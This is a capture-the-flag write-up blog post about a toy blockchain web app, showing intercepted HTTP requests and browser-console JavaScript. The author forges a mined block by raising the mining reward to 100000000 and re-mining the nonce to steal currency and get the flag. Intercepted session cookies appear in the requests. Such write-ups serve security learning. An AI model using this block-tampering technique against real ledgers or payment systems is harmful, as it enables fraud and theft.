---
layout:     post
title:      "Blockchain challenge"
description: "With this bad implementation of blockhain, let's become a millionaire."
date:       2018-06-03 0:00:00
author:     "W3ndige"
permalink: /:title/
category: 'Write-Ups'
---

I got this challenge from my friend **Yodak**, with simple instruction - become a millionaire. At first we are presented with a webpage containing 2 forms - register and login.

{% highlight html %}
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <style>
      body {
        background-color: gray;
      }
    </style>
    <meta charset="utf-8">

    <title></title>
  </head>
  <body>

    Elo,
    <a href="/register">Register</a>
    <a href="/login">Login</a>

  </body>
</html>
{% endhighlight %}

After we have our account, we can see that it's an app that will let's us send virtual currency into other users account. In addition we have `mineBlock` button. After sending small amount of money, we have to mine that block in order to complete the transfer.

![Main Page](/img/blockchain-challenge/main.png){:class="img-responsive center-block"}

After trying different techniques like sending negative numbers, I decided to take a look at the Javascript part of page source.

{% highlight javascript %}
function handleBlock() {
  console.log(document.getElementById('mine').checked);
  if(document.getElementById('mine').checked) {
    mineBlock().then(function(response) {
      var newBlock = JSON.parse(response);
      var hashed = "";
      var difficulty = "";
      for(let i=0; i<newBlock.difficulty; i++) {
        difficulty += "0";
      }
      console.log(typeof(newBlock))
      while(hashed.substring(0, newBlock.difficulty) != difficulty) {
        newBlock.nonce += 1;
        var strToHash = newBlock.previusHash + newBlock.date + newBlock.transactions + newBlock.nonce;
        hashed = sha256(strToHash);
      }
      newBlock.hash = hashed;
      var xhr2 = new XMLHttpRequest();
      xhr2.open("POST", "/sendblock", true);
      xhr2.setRequestHeader("Content-Type", "application/json");
      xhr2.onreadystatechange = function () {
        if (xhr2.readyState === 4 && xhr2.status === 200) {
            console.log(xhr2.responseText);
        }
      };
      xhr2.send(JSON.stringify(newBlock));
      console.log(JSON.stringify(newBlock));
      handleBlock();
    }).catch(function(error) {
        console.log("ERRORRRRR");
        console.log(error);
        setTimeout(handleBlock, 5000);
    });
  }
}

function mineBlock() {
    return new Promise(function(resolve, reject) {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "/getblock", true);
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
          if(xhr.status == 200)
            resolve(xhr.responseText)
          else
            reject(xhr.status)
        }
      };
      xhr.send();
    });
}
{% endhighlight %}

In here we can see two additional pages - `getblock` and `sendblock` that are used in transactions. In addition, we can see that the information is passed using JSON so I decided to fire up BurpSuite and take a look at that information. In additon we have information that the hash i created from `newBlock.previusHash + newBlock.date + newBlock.transactions + newBlock.nonce`.

Firstly, let's make a small transfer.

{% highlight text %}
POST /user HTTP/1.1
Host: 185.243.54.103:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://185.243.54.103:5000/user
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Cookie: session=eyJ1c2VyIjoiZyJ9.De86bA._5mt5MP3jSvnrSa93vYjwjiywsA
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

adress=g&amount=5
{% endhighlight %}

Now we're ready to turn on the miner and see the traffic. Firstly we get the response from `getblock`.

{% highlight text %}
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 211
Vary: Cookie
Server: Werkzeug/0.14.1 Python/3.4.2
Date: Tue, 29 May 2018 19:26:42 GMT

{"date": 1527622002.2765806, "difficulty": 4, "hash": "", "nonce": 0, "previusHash": "00001bdf900d3f92b946e058bcfa8a327d484b112e63746004b8e3d68d0768e7", "transactions": [["e", "a", 50], ["minedReward", "g", 1]]}
{% endhighlight %}

Now miner sends the response using `sendblock`.

{% highlight text %}
POST /sendblock HTTP/1.1
Host: 185.243.54.103:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://185.243.54.103:5000/user
Content-Type: application/json
Content-Length: 263
Cookie: session=eyJ1c2VyIjoiZyJ9.De86bA._5mt5MP3jSvnrSa93vYjwjiywsA
DNT: 1
Connection: close

{"date":1527622002.2765806,"difficulty":4,"hash":"000021492e9b9b756122db048705babd4cb3e3098a6afb1d33b9d842864d1939","nonce":11829,"previusHash":"00001bdf900d3f92b946e058bcfa8a327d484b112e63746004b8e3d68d0768e7","transactions":[["e","a",50],["minedReward","g",1]]}
{% endhighlight %}

Plan is simple, we're going to transfer some amount of money, and manually using BurpSuite Repeater get the JSON block data using the `getblock`.

That's the block we're going to mine manually.

![Getblock](/img/blockchain-challenge/getblock.png){:class="img-responsive center-block"}

{% highlight text %}
{"date": 1527622270.298562, "difficulty": 4, "hash": "", "nonce": 0, "previusHash": "000021492e9b9b756122db048705babd4cb3e3098a6afb1d33b9d842864d1939", "transactions": [["g", "b", 10], ["minedReward", "g", 1]]}
{% endhighlight %}

Firstly I wanted to do it in Python but as I was unsure that these values would parse in the same way as in JS, i decided to do it in browser console. Simply copy/paste the instructions code the source that was used to mine.

{% highlight javascript %}
newBlock = JSON.parse('{"date": 1527622270.298562, "difficulty": 4, "hash": "", "nonce": 0, "previusHash": "000021492e9b9b756122db048705babd4cb3e3098a6afb1d33b9d842864d1939", "transactions": [["g", "b", 10], ["minedReward", "g", 1]]}');
Object { date: 1527622270.298562, difficulty: 4, hash: "", nonce: 0, previusHash: "000021492e9b9b756122db048705babd4cb3e3098a6afb1d33b9d842864d1939", transactions: (2) […] }

var hashed = "";
var difficulty = "";
for(let i=0; i<newBlock.difficulty; i++) {
    difficulty += "0";
}
"0000"

newBlock.transactions
(2) […]
​
0: Array(3) [ "g", "b", 10 ]
​
1: Array(3) [ "minedReward", "g", 1 ]
​
length: 2
​
__proto__: Array []

newBlock.transactions[1][2] = 100000000
100000000
newBlock.transactions
(2) […]
​
0: Array(3) [ "g", "b", 10 ]
​
1: Array(3) [ "minedReward", "g", 100000000 ]
​
length: 2
​
__proto__: Array []

while(hashed.substring(0, newBlock.difficulty) != difficulty) {
  newBlock.nonce += 1;
  var strToHash = newBlock.previusHash + newBlock.date + newBlock.transactions + newBlock.nonce;
  hashed = sha256(strToHash);
}
"00008b0833e08517be5dbc1fd645d188e747f8bd4fd170e6dead6696b7e10008"
newBlock.nonce
38925
{% endhighlight %}

Now we're ready to send the new information through the repeater.

![Sendblocks](/img/blockchain-challenge/sendblock.png){:class="img-responsive center-block"}

{% highlight text %}
{"date": 1527622270.298562, "difficulty": 4, "hash": "00008b0833e08517be5dbc1fd645d188e747f8bd4fd170e6dead6696b7e10008", "nonce": 38925, "previusHash": "000021492e9b9b756122db048705babd4cb3e3098a6afb1d33b9d842864d1939", "transactions": [["g", "b", 10], ["minedReward", "g", 100000000]]}
{% endhighlight %}

And here's the flag `RSCTF_{F1RST_MILLION$$_U_H$VE_TO_STEAL}`!
